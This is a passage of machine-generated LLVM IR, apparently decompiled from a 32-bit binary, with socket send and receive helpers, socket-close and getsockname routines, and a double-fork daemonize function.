  %stack_var_-56.1 = phi i32 [ 0, %dec_label_pc_408a48 ], [ %v2_408a80, %dec_label_pc_408a54 ]
  %v2_408a94 = add i32 %stack_var_-52.05, %stack_var_-64.0.ph
  %v1_408aa4 = add i32 %stack_var_20.0.ph, -1
  store i32 %v1_408aa4, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_408aac.outer

dec_label_pc_408aac.outer:                        ; preds = %dec_label_pc_408768, %dec_label_pc_408a88
  %stack_var_20.0.ph = phi i32 [ %arg6., %dec_label_pc_408768 ], [ %v1_408aa4, %dec_label_pc_408a88 ]
  %stack_var_-56.2.ph = phi i32 [ %stack_var_-56.0, %dec_label_pc_408768 ], [ %stack_var_-56.1, %dec_label_pc_408a88 ]
  %stack_var_-60.1.ph = phi i8 [ %v1_408694, %dec_label_pc_408768 ], [ %stack_var_-60.07, %dec_label_pc_408a88 ]
  %stack_var_-64.0.ph = phi i32 [ 0, %dec_label_pc_408768 ], [ %v2_408a94, %dec_label_pc_408a88 ]
  %v2_408ab8 = icmp ult i32 %stack_var_-64.0.ph, %arg5
  %v3_408ab8 = zext i1 %v2_408ab8 to i32
  %v1_408abc = icmp eq i1 %v2_408ab8, false
  %v1_408acc = icmp eq i32 %stack_var_20.0.ph, 0
  %v4_408794 = zext i8 %stack_var_-60.1.ph to i32
  %v1_40879c = icmp eq i8 %stack_var_-60.1.ph, 0
  %v2_408820 = sub i32 %arg5, %stack_var_-64.0.ph
  br label %dec_label_pc_408aac.outer8

dec_label_pc_408aac.outer8:                       ; preds = %dec_label_pc_408884, %dec_label_pc_408aac.outer
  %stack_var_-56.2.ph9 = phi i32 [ %stack_var_-56.2.ph, %dec_label_pc_408aac.outer ], [ 0, %dec_label_pc_408884 ]
  %v1_408890 = icmp eq i32 %stack_var_-56.2.ph9, 0
  br label %dec_label_pc_408aac

dec_label_pc_408aac:                              ; preds = %dec_label_pc_408aac.outer8, %dec_label_pc_408894
  store i32 %v3_408ab8, i32* %v0.global-to-local, align 4
  br i1 %v1_408abc, label %dec_label_pc_408ad4, label %dec_label_pc_408ac0

dec_label_pc_408ac0:                              ; preds = %dec_label_pc_408aac
  store i32 %stack_var_20.0.ph, i32* %v0.global-to-local, align 4
  br i1 %v1_408acc, label %dec_label_pc_408ad4, label %dec_label_pc_408794

dec_label_pc_408ad4:                              ; preds = %dec_label_pc_408ac0, %dec_label_pc_408aac, %dec_label_pc_408920, %dec_label_pc_408930
  store i32 %stack_var_-64.0.ph, i32* %v0.global-to-local, align 4
  store i32 %v0_408660, i32* @fp, align 4
  ret i32 %stack_var_-64.0.ph

; uselistorder directives
  uselistorder i1 %v1_408890, { 1, 0 }
  uselistorder i32 %stack_var_-56.2.ph9, { 2, 3, 4, 1, 0 }
  uselistorder i1 %v1_40879c, { 1, 0 }
  uselistorder i32 %stack_var_-64.0.ph, { 1, 0, 3, 4, 2 }
  uselistorder i8 %stack_var_-60.1.ph, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_20.0.ph, { 1, 0, 2 }
  uselistorder i8 %stack_var_-60.0, { 1, 0 }
  uselistorder i32 %stack_var_-52.0, { 1, 0 }
  uselistorder i32 %v0_40884c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_408834, { 1, 0 }
  uselistorder i32 %v4_4086d4, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 2, 3, 4, 0, 6, 5 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 16, 13, 14, 15, 19, 17, 18, 22, 20, 40, 21, 23, 24, 25, 32, 26, 29, 27, 30, 28, 31, 36, 33, 34, 35, 37, 38, 41, 39 }
  uselistorder i32* %gp.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 10, 8, 9, 11, 12 }
  uselistorder i32 %arg7, { 3, 2, 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_408ad4, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_408aac.outer8, { 1, 0 }
  uselistorder label %dec_label_pc_408aac.outer, { 1, 0 }
  uselistorder label %dec_label_pc_408a88, { 1, 0 }
  uselistorder label %dec_label_pc_408a48, { 0, 1, 4, 5, 3, 2 }
  uselistorder label %dec_label_pc_40884c, { 1, 0 }
  uselistorder label %dec_label_pc_408768, { 1, 0 }
  uselistorder label %dec_label_pc_40872c, { 2, 0, 1 }
}

define i32 @function_408af0(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_408af0:
  %stack_var_0 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v2_408af0 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_408af0, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_0, align 4
  %v1_408bc4 = add i32 %arg3, -1
  %v2_408bd02 = icmp ne i32 %v1_408bc4, 0
  %v1_408bd44 = icmp eq i1 %v2_408bd02, false
  br i1 %v1_408bd44, label %dec_label_pc_408bf4.thread, label %dec_label_pc_408bd8

dec_label_pc_408bf4.thread:                       ; preds = %dec_label_pc_408af0
  br label %dec_label_pc_408c10

dec_label_pc_408b2c:                              ; preds = %dec_label_pc_408bd8
  %v3_408b48 = load i32, i32* %stack_var_0, align 4
  %v4_408b54 = ptrtoint i8* %storemerge7 to i32
  %v9_408b58 = call i32 @sock_recvfrom(i32 %v3_408b48, i32* null, i32 0, i32 %v4_408b54, i32 1, i32 1, i32 %arg4)
  %v2_408b6c = icmp eq i32 %v9_408b58, 1
  br i1 %v2_408b6c, label %dec_label_pc_408b7c, label %dec_label_pc_408bf4

dec_label_pc_408b7c:                              ; preds = %dec_label_pc_408b2c
  %v2_408b88 = add i32 %stack_var_-20.05, 1
  %v2_408b98 = load i8, i8* %storemerge7, align 1
  %v1_408ba4 = icmp eq i8 %v2_408b98, 10
  %v1_408ba8 = zext i1 %v1_408ba4 to i8
  %v1_408bb4 = add i32 %v4_408b54, 1
  %v5_408bb8 = inttoptr i32 %v1_408bb4 to i8*
  %v2_408bd0 = icmp ult i32 %v2_408b88, %v1_408bc4
  %v1_408bd4 = icmp eq i1 %v2_408bd0, false
  br i1 %v1_408bd4, label %dec_label_pc_408bf4, label %dec_label_pc_408bd8

dec_label_pc_408bd8:                              ; preds = %dec_label_pc_408af0, %dec_label_pc_408b7c
  %storemerge7 = phi i8* [ %v5_408bb8, %dec_label_pc_408b7c ], [ %arg2, %dec_label_pc_408af0 ]
  %stack_var_-24.06 = phi i8 [ %v1_408ba8, %dec_label_pc_408b7c ], [ 0, %dec_label_pc_408af0 ]
  %stack_var_-20.05 = phi i32 [ %v2_408b88, %dec_label_pc_408b7c ], [ 0, %dec_label_pc_408af0 ]
  %v1_408bec = icmp eq i8 %stack_var_-24.06, 1
  br i1 %v1_408bec, label %dec_label_pc_408bf4, label %dec_label_pc_408b2c

dec_label_pc_408bf4:                              ; preds = %dec_label_pc_408b7c, %dec_label_pc_408b2c, %dec_label_pc_408bd8
  %stack_var_-24.0.lcssa = phi i8 [ %stack_var_-24.06, %dec_label_pc_408bd8 ], [ %stack_var_-24.06, %dec_label_pc_408b2c ], [ %v1_408ba8, %dec_label_pc_408b7c ]
  %storemerge.lcssa = phi i8* [ %storemerge7, %dec_label_pc_408bd8 ], [ %storemerge7, %dec_label_pc_408b2c ], [ %v5_408bb8, %dec_label_pc_408b7c ]
  %v4_408bf4 = zext i8 %stack_var_-24.0.lcssa to i32
  %v1_408bfc = icmp eq i8 %stack_var_-24.0.lcssa, 0
  br i1 %v1_408bfc, label %dec_label_pc_408c10, label %dec_label_pc_408c00

dec_label_pc_408c00:                              ; preds = %dec_label_pc_408bf4
  store i8 0, i8* %storemerge.lcssa, align 1
  br label %dec_label_pc_408c10

dec_label_pc_408c10:                              ; preds = %dec_label_pc_408bf4.thread, %dec_label_pc_408bf4, %dec_label_pc_408c00
  %v4_408bf419 = phi i32 [ 0, %dec_label_pc_408bf4.thread ], [ %v4_408bf4, %dec_label_pc_408bf4 ], [ %v4_408bf4, %dec_label_pc_408c00 ]
  ret i32 %v4_408bf419

; uselistorder directives
  uselistorder i8 %stack_var_-24.06, { 1, 2, 0 }
  uselistorder i32 %v1_408bc4, { 1, 0 }
  uselistorder label %dec_label_pc_408c10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_408bf4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_408bd8, { 1, 0 }
}

define i32 @sock_sendto(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v0.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v1_408c68 = icmp ne i32 %arg2, 0
  store i32 0, i32* %stack_var_-16, align 4
  %v2_408c80 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_408c80, i32* %v0.global-to-local, align 4
  %v4_408c90 = call i32 @function_408354(i32 %arg1, i32* nonnull %stack_var_-16, i32 0)
  store i32 %v4_408c90, i32* %v0.global-to-local, align 4
  %v1_408c9c = icmp eq i32 %v4_408c90, 0
  br i1 %v1_408c9c, label %dec_label_pc_408d04, label %dec_label_pc_408ca0

dec_label_pc_408ca0:                              ; preds = %entry
  %v3_408ca4 = load i32, i32* %stack_var_-16, align 4
  %v4_408cac = udiv i32 %v3_408ca4, 1000
  store i32 %v4_408cac, i32* %stack_var_-16, align 4
  store i32 %v4_408cac, i32* %v0.global-to-local, align 4
  %tmp61 = icmp ult i32 %v3_408ca4, 1000
  br i1 %tmp61, label %dec_label_pc_408d04, label %dec_label_pc_408cd0

dec_label_pc_408cd0:                              ; preds = %dec_label_pc_408ca0
  %v3_408cd8 = load i32, i32* @global_var_41b214.76, align 4
  store i32 %v3_408cd8, i32* %v0.global-to-local, align 4
  %v3_408ce4 = call i32 @time(i32* null)
  %v3_408cf4 = load i32, i32* %stack_var_-16, align 4
  %v2_408cfc = add i32 %v3_408cf4, %v3_408ce4
  store i32 %v2_408cfc, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_408d04

dec_label_pc_408d04:                              ; preds = %dec_label_pc_408ca0, %entry, %dec_label_pc_408cd0
  %stack_var_-60.0 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_408ca0 ], [ %v2_408cfc, %dec_label_pc_408cd0 ]
  %v4_408d04 = zext i1 %v1_408c68 to i32
  store i32 %v4_408d04, i32* %v0.global-to-local, align 4
  %v1_408d0c = icmp eq i1 %v1_408c68, false
  br i1 %v1_408d0c, label %dec_label_pc_408dd8, label %dec_label_pc_408d10

dec_label_pc_408d10:                              ; preds = %dec_label_pc_408d04
  %v3_408d24 = load i32, i32* @global_var_41b220.22, align 4
  store i32 %v3_408d24, i32* %v0.global-to-local, align 4
  %v5_408d30 = call i32* @memset(i32* nonnull %stack_var_-32, i32 0, i32 16)
  store i32 2, i32* %stack_var_-32, align 4
  %v4_408db0 = zext i16 %arg3 to i32
  %div = udiv i16 %arg3, 256
  %v1_408dbc = zext i16 %div to i32
  %v1_408dc0 = mul nuw nsw i32 %v4_408db0, 256
  %v1_408dc0.masked = and i32 %v1_408dc0, 65280
  %v4_408dcc = or i32 %v1_408dc0.masked, %v1_408dbc
  store i32 %v4_408dcc, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_408dd8

dec_label_pc_408dd8:                              ; preds = %dec_label_pc_408d04, %dec_label_pc_408d10
  %v1_408de0 = icmp sgt i32 %arg6, -1
  %arg6. = select i1 %v1_408de0, i32 %arg6, i32 2147483647
  br label %dec_label_pc_409048.outer

dec_label_pc_408e04:                              ; preds = %dec_label_pc_40905c
  store i32 %v2_408e94, i32* %v0.global-to-local, align 4
  br i1 %v1_408d0c, label %dec_label_pc_408e78, label %dec_label_pc_408e10

dec_label_pc_408e10:                              ; preds = %dec_label_pc_408e04
  %v3_408e58 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32 -32420) to i32*), align 4
  store i32 %v3_408e58, i32* %v0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_408e58)
  br label %dec_label_pc_408ec0

dec_label_pc_408e78:                              ; preds = %dec_label_pc_408e04
  %v3_408ea8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32 -32340) to i32*), align 4
  store i32 %v3_408ea8, i32* %v0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_408ea8)
  br label %dec_label_pc_408ec0

dec_label_pc_408ec0:                              ; preds = %dec_label_pc_408e10, %dec_label_pc_408e78
  %v0_408ec0 = load i32, i32* %v0.global-to-local, align 4
  %v1_408ecc = icmp sgt i32 %v0_408ec0, -1
  br i1 %v1_408ecc, label %dec_label_pc_408fe4, label %dec_label_pc_408ed0

dec_label_pc_408ed0:                              ; preds = %dec_label_pc_408ec0
  %v3_408ed4 = load i32, i32* @global_var_41b1f4.163, align 4
  store i32 %v3_408ed4, i32* %v0.global-to-local, align 4
  %v1_408ee0 = call i32* @__errno_location()
  %v3_408ee0 = ptrtoint i32* %v1_408ee0 to i32
  store i32 %v3_408ee0, i32* %v0.global-to-local, align 4
  %v2_408eec = load i32, i32* %v1_408ee0, align 4
  store i32 4, i32* %v0.global-to-local, align 4
  %v2_408ef4 = icmp eq i32 %v2_408eec, 4
  br i1 %v2_408ef4, label %dec_label_pc_408ef8, label %dec_label_pc_408f48

dec_label_pc_408ef8:                              ; preds = %dec_label_pc_408ed0
  store i32 %stack_var_-60.2.ph6, i32* %v0.global-to-local, align 4
  br i1 %v1_408f04, label %dec_label_pc_409048.outer5, label %dec_label_pc_408f08

dec_label_pc_408f08:                              ; preds = %dec_label_pc_408ef8
  %v3_408f10 = load i32, i32* @global_var_41b214.76, align 4
  store i32 %v3_408f10, i32* %v0.global-to-local, align 4
  %v3_408f1c = call i32 @time(i32* null)
  %v2_408f34 = icmp slt i32 %stack_var_-60.2.ph6, %v3_408f1c
  %v3_408f34 = zext i1 %v2_408f34 to i32
  store i32 %v3_408f34, i32* %v0.global-to-local, align 4
  br i1 %v2_408f34, label %dec_label_pc_408fe4.thread, label %dec_label_pc_409048

dec_label_pc_408fe4.thread:                       ; preds = %dec_label_pc_408f08
  store i32 %stack_var_-60.2.ph6, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_408ff0

dec_label_pc_408f48:                              ; preds = %dec_label_pc_408ed0
  %v3_408f48 = load i32, i32* @global_var_41b1f4.163, align 4
  store i32 %v3_408f48, i32* %v0.global-to-local, align 4
  %v1_408f54 = call i32* @__errno_location()
  %v3_408f54 = ptrtoint i32* %v1_408f54 to i32
  store i32 %v3_408f54, i32* %v0.global-to-local, align 4
  %v2_408f60 = load i32, i32* %v1_408f54, align 4
  store i32 11, i32* %v0.global-to-local, align 4
  %v2_408f68 = icmp eq i32 %v2_408f60, 11
  br i1 %v2_408f68, label %dec_label_pc_408fe4, label %dec_label_pc_408f6c

dec_label_pc_408f6c:                              ; preds = %dec_label_pc_408f48
  %v3_408f70 = load i32, i32* @global_var_41b1f4.163, align 4
  store i32 %v3_408f70, i32* %v0.global-to-local, align 4
  %v1_408f7c = call i32* @__errno_location()
  %v3_408f7c = ptrtoint i32* %v1_408f7c to i32
  store i32 %v3_408f7c, i32* %v0.global-to-local, align 4
  %v2_408f88 = load i32, i32* %v1_408f7c, align 4
  store i32 11, i32* %v0.global-to-local, align 4
  %v2_408f90 = icmp eq i32 %v2_408f88, 11
  br i1 %v2_408f90, label %dec_label_pc_408fe4, label %dec_label_pc_408f94

dec_label_pc_408f94:                              ; preds = %dec_label_pc_408f6c
  store i32 %arg7, i32* %v0.global-to-local, align 4
  %v1_408fa0 = icmp eq i32 %arg7, 0
  br i1 %v1_408fa0, label %dec_label_pc_409070, label %dec_label_pc_408fa4

dec_label_pc_408fa4:                              ; preds = %dec_label_pc_408f94
  %v3_408fa8 = load i32, i32* @global_var_41b1f4.163, align 4
  store i32 %v3_408fa8, i32* %v0.global-to-local, align 4
  %v1_408fb4 = call i32* @__errno_location()
  %v3_408fb4 = ptrtoint i32* %v1_408fb4 to i32
  store i32 %v3_408fb4, i32* %v0.global-to-local, align 4
  %v2_408fc0 = load i32, i32* %v1_408fb4, align 4
  store i32 %arg7, i32* %v0.global-to-local, align 4
  %v2_408fcc = inttoptr i32 %arg7 to i32*
  store i32 %v2_408fc0, i32* %v2_408fcc, align 4
  br label %dec_label_pc_409070

dec_label_pc_408fe4:                              ; preds = %dec_label_pc_408ec0, %dec_label_pc_408f48, %dec_label_pc_408f6c
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_408f6c ], [ 0, %dec_label_pc_408f48 ], [ %v0_408ec0, %dec_label_pc_408ec0 ]
  store i32 %stack_var_-60.2.ph6, i32* %v0.global-to-local, align 4
  br i1 %v1_408f04, label %dec_label_pc_409024, label %dec_label_pc_408ff0

dec_label_pc_408ff0:                              ; preds = %dec_label_pc_408fe4.thread, %dec_label_pc_408fe4
  %stack_var_-56.03 = phi i32 [ 0, %dec_label_pc_408fe4.thread ], [ %stack_var_-56.0, %dec_label_pc_408fe4 ]
  %v3_408ff8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32 -32476) to i32*), align 4
  store i32 %v3_408ff8, i32* %v0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_408ff8)
  %v0_409010 = load i32, i32* %v0.global-to-local, align 4
  %v3_409014 = load i32, i32* %stack_var_-16, align 4
  %v2_40901c = add i32 %v3_409014, %v0_409010
  store i32 %v2_40901c, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_409024

dec_label_pc_409024:                              ; preds = %dec_label_pc_408fe4, %dec_label_pc_408ff0
  %stack_var_-56.04 = phi i32 [ %stack_var_-56.0, %dec_label_pc_408fe4 ], [ %stack_var_-56.03, %dec_label_pc_408ff0 ]
  %stack_var_-60.1 = phi i32 [ 0, %dec_label_pc_408fe4 ], [ %v2_40901c, %dec_label_pc_408ff0 ]
  store i32 %stack_var_-56.04, i32* %v0.global-to-local, align 4
  %v2_409030 = add i32 %stack_var_-56.04, %stack_var_-64.0.ph
  %v1_409040 = add i32 %stack_var_20.0.ph, -1
  br label %dec_label_pc_409048.outer

dec_label_pc_409048.outer:                        ; preds = %dec_label_pc_408dd8, %dec_label_pc_409024
  %stack_var_20.0.ph = phi i32 [ %arg6., %dec_label_pc_408dd8 ], [ %v1_409040, %dec_label_pc_409024 ]
  %stack_var_-60.2.ph = phi i32 [ %stack_var_-60.0, %dec_label_pc_408dd8 ], [ %stack_var_-60.1, %dec_label_pc_409024 ]
  %stack_var_-64.0.ph = phi i32 [ 0, %dec_label_pc_408dd8 ], [ %v2_409030, %dec_label_pc_409024 ]
  store i32 %stack_var_20.0.ph, i32* %v0.global-to-local, align 4
  %v2_409054 = icmp ult i32 %stack_var_-64.0.ph, %arg5
  %v3_409054 = zext i1 %v2_409054 to i32
  %v1_409058 = icmp eq i1 %v2_409054, false
  %v1_409068 = icmp eq i32 %stack_var_20.0.ph, 0
  %v2_408e94 = sub i32 %arg5, %stack_var_-64.0.ph
  br label %dec_label_pc_409048.outer5

dec_label_pc_409048.outer5:                       ; preds = %dec_label_pc_408ef8, %dec_label_pc_409048.outer
  %stack_var_-60.2.ph6 = phi i32 [ %stack_var_-60.2.ph, %dec_label_pc_409048.outer ], [ 0, %dec_label_pc_408ef8 ]
  %v1_408f04 = icmp eq i32 %stack_var_-60.2.ph6, 0
  br label %dec_label_pc_409048

dec_label_pc_409048:                              ; preds = %dec_label_pc_409048.outer5, %dec_label_pc_408f08
  store i32 %v3_409054, i32* %v0.global-to-local, align 4
  br i1 %v1_409058, label %dec_label_pc_409070, label %dec_label_pc_40905c

dec_label_pc_40905c:                              ; preds = %dec_label_pc_409048
  store i32 %stack_var_20.0.ph, i32* %v0.global-to-local, align 4
  br i1 %v1_409068, label %dec_label_pc_409070, label %dec_label_pc_408e04

dec_label_pc_409070:                              ; preds = %dec_label_pc_40905c, %dec_label_pc_409048, %dec_label_pc_408f94, %dec_label_pc_408fa4
  store i32 %stack_var_-64.0.ph, i32* %v0.global-to-local, align 4
  ret i32 %stack_var_-64.0.ph

; uselistorder directives
  uselistorder i1 %v1_408f04, { 1, 0 }
  uselistorder i32 %stack_var_-60.2.ph6, { 2, 3, 4, 1, 0 }
  uselistorder i32 %stack_var_-64.0.ph, { 1, 0, 3, 4, 2 }
  uselistorder i32 %stack_var_20.0.ph, { 2, 1, 0, 3 }
  uselistorder i32 %stack_var_-56.0, { 1, 0 }
  uselistorder i32 %v4_408cac, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 2, 3, 4, 0, 6, 5 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 2, 37, 3, 4, 5, 6, 7, 8, 12, 9, 10, 11, 15, 13, 14, 18, 16, 36, 17, 19, 20, 21, 28, 22, 25, 23, 26, 24, 27, 29, 30, 31, 32, 33, 35, 34 }
  uselistorder i32 -32476, { 1, 0 }
  uselistorder i32 11, { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 (i32*)* @time, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 1000, { 4, 7, 5, 8, 0, 9, 1, 10, 6, 11, 2, 3 }
  uselistorder i32 %arg7, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_409070, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_409048.outer5, { 1, 0 }
  uselistorder label %dec_label_pc_409048.outer, { 1, 0 }
  uselistorder label %dec_label_pc_409024, { 1, 0 }
  uselistorder label %dec_label_pc_408ff0, { 1, 0 }
  uselistorder label %dec_label_pc_408fe4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_408ec0, { 1, 0 }
  uselistorder label %dec_label_pc_408dd8, { 1, 0 }
  uselistorder label %dec_label_pc_408d04, { 2, 0, 1 }
}

define i32 @sock_close_and_invalidate(i32* %arg1) local_unnamed_addr {
entry:
  %v0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  store i32 %tmp, i32* %stack_var_0, align 4
  store i32 %tmp, i32* %v0.global-to-local, align 4
  %v2_4090b4 = load i32, i32* %arg1, align 4
  store i32 %v2_4090b4, i32* %v0.global-to-local, align 4
  %v1_4090bc = icmp sgt i32 %v2_4090b4, -1
  br i1 %v1_4090bc, label %dec_label_pc_4090cc, label %dec_label_pc_409104

dec_label_pc_4090cc:                              ; preds = %entry
  store i32 %tmp, i32* %v0.global-to-local, align 4
  %v2_4090d4 = load i32, i32* %arg1, align 4
  %v3_4090e0 = load i32, i32* @global_var_41b1c0.114, align 4
  store i32 %v3_4090e0, i32* %v0.global-to-local, align 4
  %v2_4090ec = call i32 @close(i32 %v2_4090d4)
  %v3_4090f8 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_4090f8, i32* %v0.global-to-local, align 4
  %v2_409100 = inttoptr i32 %v3_4090f8 to i32*
  store i32 -1, i32* %v2_409100, align 4
  %v1_409114.pre = load i32, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_409104

dec_label_pc_409104:                              ; preds = %entry, %dec_label_pc_4090cc
  %v1_409114 = phi i32 [ %v2_4090b4, %entry ], [ %v1_409114.pre, %dec_label_pc_4090cc ]
  ret i32 %v1_409114

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder label %dec_label_pc_409104, { 1, 0 }
}

define i32 @function_40911c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_40911c:
  %tmp = inttoptr i32 %arg3 to i16*
  %tmp5 = call i16 @__decompiler_undefined_function_4()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  store i32 16, i32* %stack_var_-16, align 4
  %tmp20 = bitcast i32* %stack_var_-32 to %sockaddr*
  %v7_409174 = call i32 @getsockname(i32 %arg1, %sockaddr* %tmp20, i32* nonnull %stack_var_-16)
  %v1_409180 = icmp eq i32 %v7_409174, 0
  br i1 %v1_409180, label %dec_label_pc_409184, label %dec_label_pc_409254

dec_label_pc_409184:                              ; preds = %dec_label_pc_40911c
  %v1_409190 = icmp eq i32* %arg2, null
  br i1 %v1_409190, label %dec_label_pc_4091fc, label %dec_label_pc_409194

dec_label_pc_409194:                              ; preds = %dec_label_pc_409184
  %v2_4091e4 = call i32 @llvm.bswap.i32(i32 %tmp8)
  store i32 %v2_4091e4, i32* %arg2, align 4
  br label %dec_label_pc_4091fc

dec_label_pc_4091fc:                              ; preds = %dec_label_pc_409184, %dec_label_pc_409194
  %v1_409204 = icmp eq i32 %arg3, 0
  br i1 %v1_409204, label %dec_label_pc_409244, label %dec_label_pc_409208

dec_label_pc_409208:                              ; preds = %dec_label_pc_4091fc
  %div = udiv i16 %tmp5, 256
  %v1_409228 = mul i16 %tmp5, 256
  %v2_40922c = or i16 %v1_409228, %div
  store i16 %v2_40922c, i16* %tmp, align 2
  br label %dec_label_pc_409244

dec_label_pc_409244:                              ; preds = %dec_label_pc_4091fc, %dec_label_pc_409208
  br label %dec_label_pc_40928c

dec_label_pc_409254:                              ; preds = %dec_label_pc_40911c
  %v1_40925c = icmp eq i32 %arg4, 0
  br i1 %v1_40925c, label %dec_label_pc_40928c, label %dec_label_pc_409260

dec_label_pc_409260:                              ; preds = %dec_label_pc_409254
  %v1_409270 = call i32* @__errno_location()
  %v2_40927c = load i32, i32* %v1_409270, align 4
  %v2_409288 = inttoptr i32 %arg4 to i32*
  store i32 %v2_40927c, i32* %v2_409288, align 4
  br label %dec_label_pc_40928c

dec_label_pc_40928c:                              ; preds = %dec_label_pc_409254, %dec_label_pc_409244, %dec_label_pc_409260
  %stack_var_-48.0 = phi i32 [ 1, %dec_label_pc_409244 ], [ 0, %dec_label_pc_409254 ], [ 0, %dec_label_pc_409260 ]
  ret i32 %stack_var_-48.0

; uselistorder directives
  uselistorder i16 256, { 0, 3, 4, 1, 5, 2, 6 }
  uselistorder i32 16, { 5, 1, 0, 6, 3, 2, 4, 7, 8 }
  uselistorder label %dec_label_pc_40928c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_409244, { 1, 0 }
  uselistorder label %dec_label_pc_4091fc, { 1, 0 }
}

define i32 @function_4092a8() local_unnamed_addr {
dec_label_pc_4092a8:
  %v6_4092e0 = call i32* @dlsym(i32* inttoptr (i32 -1 to i32*), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_40aa10.174, i32 0, i32 0))
  %v8_4092e0 = ptrtoint i32* %v6_4092e0 to i32
  %v1_4092f8 = icmp eq i32* %v6_4092e0, null
  br i1 %v1_4092f8, label %dec_label_pc_409320, label %dec_label_pc_4092fc

dec_label_pc_4092fc:                              ; preds = %dec_label_pc_4092a8
  call void @__pseudo_call(i32 %v8_4092e0)
  br label %dec_label_pc_409338

dec_label_pc_409320:                              ; preds = %dec_label_pc_4092a8
  %v1_40932c = call i32 @fork()
  br label %dec_label_pc_409338

dec_label_pc_409338:                              ; preds = %dec_label_pc_4092fc, %dec_label_pc_409320
  %v1_409348 = phi i32 [ %v8_4092e0, %dec_label_pc_4092fc ], [ %v1_40932c, %dec_label_pc_409320 ]
  ret i32 %v1_409348

; uselistorder directives
  uselistorder label %dec_label_pc_409338, { 1, 0 }
}

define i32 @proc_daemonize() local_unnamed_addr {
entry:
  %v1_409378 = call i32 @function_405774(i32 1)
  %v1_409388 = call i32 @function_405774(i32 17)
  %v1_409398 = call i32 @function_405774(i32 13)
  %v0_4093a4 = call i32 @function_4092a8()
  %v1_4093bc = icmp sgt i32 %v0_4093a4, -1
  br i1 %v1_4093bc, label %dec_label_pc_4093dc, label %dec_label_pc_4093dc.thread

dec_label_pc_4093dc.thread:                       ; preds = %entry
  call void @exit(i32 -1)
  unreachable

dec_label_pc_4093dc:                              ; preds = %entry
  %v1_4093e4 = icmp eq i32 %v0_4093a4, 0
  br i1 %v1_4093e4, label %dec_label_pc_409404, label %dec_label_pc_4093e8

dec_label_pc_4093e8:                              ; preds = %dec_label_pc_4093dc
  call void @exit(i32 0)
  unreachable

dec_label_pc_409404:                              ; preds = %dec_label_pc_4093dc
  %v0_409404 = call i32 @function_4092a8()
  %v1_40941c = icmp sgt i32 %v0_409404, -1
  br i1 %v1_40941c, label %dec_label_pc_40943c, label %dec_label_pc_40943c.thread

dec_label_pc_40943c.thread:                       ; preds = %dec_label_pc_409404
  call void @exit(i32 -1)
  unreachable

dec_label_pc_40943c:                              ; preds = %dec_label_pc_409404
  %v1_409444 = icmp eq i32 %v0_409404, 0
  br i1 %v1_409444, label %dec_label_pc_409464, label %dec_label_pc_409448

dec_label_pc_409448:                              ; preds = %dec_label_pc_40943c
  call void @exit(i32 0)
  unreachable

dec_label_pc_409464:                              ; preds = %dec_label_pc_40943c
  %v2_409474 = call i32 @umask(i32 0)
  %v1_409490 = call i32 @setsid()
  %v1_4094a8 = icmp sgt i32 %v1_409490, -1
  br i1 %v1_4094a8, label %dec_label_pc_4094c8, label %dec_label_pc_4094ac

dec_label_pc_4094ac:                              ; preds = %dec_label_pc_409464
  call void @exit(i32 -1)
  unreachable

dec_label_pc_4094c8:                              ; preds = %dec_label_pc_409464
  %v5_4094e4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_40aa18.179, i32 0, i32 0), i32 2)
  %v1_4094fc = icmp sgt i32 %v5_4094e4, -1
